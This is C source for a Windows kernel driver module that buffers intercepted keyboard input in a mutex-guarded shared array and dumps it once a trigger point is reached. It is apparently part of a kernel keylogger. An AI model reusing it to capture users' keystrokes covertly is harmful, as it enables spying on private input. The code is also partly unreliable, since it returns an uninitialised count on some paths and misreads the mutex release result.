#include "ntddk.h"
#include "ntddkbd.h"
#include "types.h"

#include "SharedArray.h"


SHARED_ARRAY sharedArray;





void initSharedArray()
{
	sharedArray.currentIndex = 0;
	KeInitializeMutex(&(sharedArray.mutex), 0);

	return;
}/*end initSharedArray()-------------------------------------------------------------------------------------------------------------*/





BOOLEAN isBufferReady()
{
	//Don't need to synchronize read operations, just when modify
	if (sharedArray.currentIndex >= TRIGGER_POINT)
		return TRUE;

	return FALSE;
}/*end isBufferReady()-------------------------------------------------------------------------------------------------------------*/




void addEntry(KEYBOARD_INPUT_DATA key)
{
	modArray(ACTION_ADD, &key, NULL);
	return;
}/*end addEntry()-----------------------------------------------------------------------------------------------------------------*/




DWORD dumpArray(KEYBOARD_INPUT_DATA* dest)
{
	return (modArray(ACTION_DMP, NULL, dest));
}/*end dumpArray()-------------------------------------------------------------------------------------------------------------*/




DWORD modArray
(
	DWORD action,				//set to ACTION_ADD or ACTION_DMP
	KEYBOARD_INPUT_DATA* key,	//key data to add (if ACTION_ADD)
	KEYBOARD_INPUT_DATA* dest	//destination array (if ACTION_DUMP)
)
{
	/*
	Grabs the shared buffer's mutex and then either adds an element to the shared buffer or dumps it into a destination array
	*/

	NTSTATUS status;
	DWORD nElements;

	//grab the mutex
	status = KeWaitForSingleObject(
		&(sharedArray.mutex),
		Executive,
		KernelMode,
		FALSE,
		NULL
	);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("[%s]: %s\n", "modArray", "could not obtain mutex properly");
		return 0;
	}

	//Do whatever it is we need to do
	if (action == ACTION_ADD)
	{
		sharedArray.buffer[sharedArray.currentIndex] = *key;
		sharedArray.currentIndex++;

		if (sharedArray.currentIndex >= SZ_SHARED_ARRAY)
			sharedArray.currentIndex = 0;
	}

	else if (action == ACTION_DMP)
	{
		DWORD i;
		if (dest == NULL)
			DbgPrint("[%s]: %s\n", "modArray", "array that we're dumping to is NULL!");

		else
		{
			for (i = 0; i < sharedArray.currentIndex; i++)
			{
				dest[i] = sharedArray.buffer[i];
			}
			nElements = i;
			sharedArray.currentIndex = 0;
		}
	}

	else
		DbgPrint("[%s]: %s\n", "modArray", "action not recognized");

	//give back mutex so other threads can grab it
	if (KeReleaseMutex(&(sharedArray.mutex), FALSE) != 0)
		DbgPrint("[%s]: %s\n", "modArray", "mutex was not released properly");

	return nElements;

}/*end modArray()-------------------------------------------------------------------------------------------------------------*/